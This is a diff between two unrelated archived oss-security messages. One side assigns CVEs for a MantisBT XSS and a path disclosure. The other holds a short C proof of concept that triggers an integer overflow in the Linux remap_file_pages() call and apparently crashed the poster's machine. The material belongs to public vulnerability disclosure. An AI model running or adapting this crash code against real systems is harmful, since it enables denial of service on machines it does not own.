@@ -1,48 +1,33 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/12/16/1
-Message-ID: <1402961491.1582851292507914388.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
-Date: Thu, 16 Dec 2010 08:58:34 -0500 (EST)
-From: Josh Bressers <bressers@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/10/12/6
+Message-Id: <20101012182739.3560D11B926@karen.lavabit.com>
+Date: Tue, 12 Oct 2010 13:27:39 -0500
+From: akiphie <akiphie@...abit.com>
 To: oss-security@...ts.openwall.com
-Cc: coley <coley@...re.org>
-Subject: Re: CVE request: MantisBT <=1.2.3 (db_type) Cross-Site Scripting & Path Disclosure Vulnerability
+Subject: Re: kernel: avoid pgoff overflow in remap_file_pages
 Content-Type: text/plain; charset=utf-8
 
-Please use CVE-2010-4348 for the XSS.
-CVE-2010-4349 for the path disclosure.
+On Tuesday 12 October 2010 09:19:29 Eugene Teo wrote:
+> Thomas Pollet reported an integer overflow issue in remap_file_pages().
+> While we are able to reproduce the issue, we are unable to find a
+> security impact. If your views differ, do let us know.
 
-Thanks.
+This made my computer very sad :(
 
--- 
-    JB
+#include <sys/mman.h>
+#include <unistd.h>
+#include <sys/ipc.h>
+#include <sys/shm.h>
+                                                                                                                                                                                    
+int main(int argc, char **argv)                                                                                                                                                     
+{                                                                                                                                                                                   
+        int x = shmget(IPC_PRIVATE, 1, IPC_CREAT | IPC_EXCL | 0600);                                                                                                                
+        void *mem = shmat(x, NULL, 0);                                                                                                                                              
+        mremap(mem, 0x1000, 0x1000, MREMAP_MAYMOVE | MREMAP_FIXED, 0x0);                                                                                                            
+        remap_file_pages((void *) 0xfff, ~0UL, 0, -(~0UL >> 12), 0);                                                                                                                
+        return 0;                                                                                                                                                                   
+}                                                                                                                                                                                   
 
+--
+cnu
 
------ "David Hicks" <hickseydr@...usnet.com.au> wrote:
-
-> This is a CVE request for a vulnerability discovered in MantisBT
-> <1.2.4
-> by Gjoko Krstic of Zero Science Lab as per the following advisory:
-> 
-> http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4983.php
-> 
-> MantisBT 1.2.4 has been released to resolve this issue.
-> 
-> For distributions or users using MantisBT 1.1.x, the following patch
-> can
-> be applied:
-> http://git.mantisbt.org/?p=mantisbt.git;a=commitdiff_plain;h=2641fdc60d2032ae1586338d6416e1eadabd7590
-> 
-> Please note that MantisBT 1.1.x is not recommended for use due to
-> many
-> security improvements and features implemented in MantisBT 1.2.x (but
-> not backported to 1.1.x).
-> 
-> Detailed information about this vulnerability can be found in this
-> bug
-> report: http://www.mantisbt.org/bugs/view.php?id=12607
-> 
-> Regards,
-> 
-> David Hicks
-> MantisBT Developer
-> mantisbt.org, #mantishelp freenode
